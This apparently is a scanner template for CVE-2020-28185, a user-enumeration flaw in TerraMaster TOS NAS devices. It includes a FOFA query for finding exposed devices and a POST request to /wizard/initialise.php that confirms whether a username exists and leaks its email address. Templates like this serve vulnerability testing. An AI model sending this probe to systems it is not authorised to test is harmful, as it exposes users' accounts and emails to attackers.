id: CVE-2020-28185

info:
  name: TerraMaster TOS 用户枚举漏洞
  author: zan8in
  severity: medium
  description: |
    TerraMaster TOS 存在用户枚举漏洞，通过wizard/initialise.php页面的username参数即可枚举系统中的用户，以及泄露邮箱信息
    fofa: "TerraMaster" && header="TOS"
  reference:
    - http://wiki.peiqi.tech/wiki/webapp/TerraMaster/TerraMaster%20TOS%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%20CVE-2020-28185.html
rules:
  r0:
    request:
      method: POST
      path: /wizard/initialise.php
      body: tab=checkuser&username=admin
    expression: |
      response.status == 200 && response.body.bcontains(b'{"username":"admin","email":"') && response.body.bcontains(b'"status":1')
expression: r0() 